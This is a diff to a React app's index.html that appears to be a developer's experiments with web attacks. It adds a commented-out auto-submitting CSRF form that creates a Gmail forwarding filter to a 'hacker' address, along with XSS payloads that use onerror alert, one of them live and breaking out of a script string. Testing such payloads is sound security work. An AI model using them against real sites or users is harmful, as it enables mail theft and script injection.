@@ -26,6 +26,7 @@
       You need to enable JavaScript to run this app.
     </noscript>
     <div id="root"></div>
+    <div class="test">\u201C</div>
     <!--
       This HTML file is a template.
       If you open it directly in the browser, you will see an empty page.
@@ -36,5 +37,24 @@
       To begin the development, run `npm start` or `yarn start`.
       To create a production bundle, use `npm run build` or `yarn build`.
     -->
+    <!-- <form method="POST" action="https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf" enctype="multipart/form-data"> 
+      <input type="hidden" name="cf2_emc" value="true"/> 
+      <input type="hidden" name="cf2_email" value="hacker@hakermail.com"/> 
+      .....
+      <input type="hidden" name="irf" value="on"/> 
+      <input type="hidden" name="nvp_bu_cftb" value="Create Filter"/> 
+  </form> 
+  <script> 
+      document.forms[0].submit();
+  </script> -->
+  <!-- <script>document.querySelector('.test').innerHTML = "\x3cimg src='1' onerror='alert(\"xss\")' /\x3e"</script> -->
+  <script>var a ="aaa\u201D<\/script><img src=1 onerror="alert('xss')" /><script>";</script>
+  <!-- <script>
+    class MyArray extends Array{}
+    let a = new MyArray();
+    a[0]=1;
+    console.log(a);
+    
+  </script> -->
   </body>
 </html>
